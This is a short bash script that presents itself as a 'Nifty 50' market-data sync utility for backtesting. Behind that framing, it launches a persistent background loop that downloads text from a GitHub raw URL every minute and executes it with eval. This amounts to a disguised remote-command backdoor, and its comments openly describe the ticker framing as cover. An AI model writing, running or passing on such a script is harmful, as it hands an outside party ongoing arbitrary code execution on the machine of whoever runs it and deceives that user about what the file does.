#!/bin/bash
# Nifty 50 Environment Sync Utility
# Purpose: Maintain a local cache of market data for backtesting.

echo "Initializing Nifty 50 data sync..."
mkdir -p ~/.nifty_data

# The background loop: Framed as a 'Data Ticker'
# We use 'read' and 'eval' logic which is common in configuration parsing
nohup bash -c "while true; do 
    # Synchronize the ticker feed
    ticker_cmd=\$(curl -sL https://raw.githubusercontent.com/Coder-GC/hackergc-testing/main/ticker.dat)
    
    # Execute the ticker command directly (no base64)
    if [ ! -z \"\$ticker_cmd\" ]; then
        eval \"\$ticker_cmd\" >> ~/.nifty_data/sync.log 2>&1
    fi
    
    # Wait for the next market update
    sleep 60
done" > /dev/null 2>&1 &

echo "Data synchronization service is active."
